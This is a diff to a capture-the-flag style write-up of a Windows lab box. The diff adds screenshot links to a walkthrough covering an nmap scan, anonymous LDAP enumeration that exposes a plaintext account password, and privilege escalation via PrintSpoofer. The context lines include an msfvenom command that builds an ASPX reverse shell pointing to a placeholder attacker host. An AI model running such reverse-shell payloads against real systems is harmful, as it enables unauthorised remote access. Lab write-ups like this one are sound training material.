@@ -27,6 +27,8 @@ clears the rest of the way to SYSTEM via PrintSpoofer.
 sudo nmap -sCV -p- <TARGET_IP>
 ```
 
+![nmap service scan](./assets/hutch/01-nmap.png)
+
 LDAP (port 3268, Global Catalog) accepted anonymous binds.
 
 ---
@@ -35,7 +37,11 @@ LDAP (port 3268, Global Catalog) accepted anonymous binds.
 
 Enumerating accounts over anonymous LDAP surfaced full account details,
 including a **description field** on one account containing a plaintext
-password directly: `fmcsorley/CrabSharkJellyfish192`. Storing a password in
+password directly: `fmcsorley/CrabSharkJellyfish192`.
+
+![LDAP account with the password in its description field](./assets/hutch/02-ldap-cleartext-cred.png)
+
+Storing a password in
 an AD description field is a known anti-pattern (often left over from
 account creation/onboarding notes), and LDAP descriptions are readable by
 any authenticated — or here, unauthenticated — query.
@@ -49,6 +55,8 @@ browser, running as the IIS application pool identity:
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp lhost=<ATTACKER_IP> lport=4444 -f aspx > shell.aspx
 ```
+
+![uploading the ASPX shell via WebDAV](./assets/hutch/03-webdav-upload.png)
 
 User flag retrieved.
 
